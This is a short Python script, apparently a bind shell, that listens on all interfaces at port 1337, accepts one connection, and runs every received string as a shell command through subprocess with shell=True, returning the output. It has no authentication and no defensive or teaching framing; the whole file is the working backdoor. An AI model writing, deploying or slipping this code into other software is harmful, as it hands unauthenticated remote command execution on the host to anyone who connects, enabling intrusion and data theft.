import socket
import subprocess

def start_server(host, port):
    # Create a socket and bind it to the specified host and port
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f'Listening for incoming connections on {host}:{port}')

    # Accept a single connection
    client_socket, client_address = server_socket.accept()
    print(f'Accepted connection from {client_address[0]}:{client_address[1]}')

    while True:
        # Receive a command from the client
        command = client_socket.recv(4096).decode()

        # Execute the command
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
        except subprocess.CalledProcessError as e:
            output = e.output.decode()

        # Send the output back to the client
        client_socket.send(output.encode())

if __name__ == '__main__':
    start_server('0.0.0.0', 1337)
